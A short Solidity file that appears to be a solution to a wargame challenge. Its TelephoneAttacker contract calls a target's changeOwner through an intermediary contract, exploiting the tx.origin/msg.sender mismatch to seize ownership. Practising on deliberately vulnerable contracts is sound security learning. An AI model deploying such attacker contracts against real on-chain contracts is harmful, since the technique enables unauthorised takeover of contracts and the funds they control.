// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface TelephoneI {
    function changeOwner(address _owner) external;
}

contract TelephoneAttacker {
    TelephoneI telephone;

    constructor(address _telephone) {
        telephone = TelephoneI(_telephone);
    }

    function callChangeOwner() external {
        telephone.changeOwner(msg.sender);
    }
}
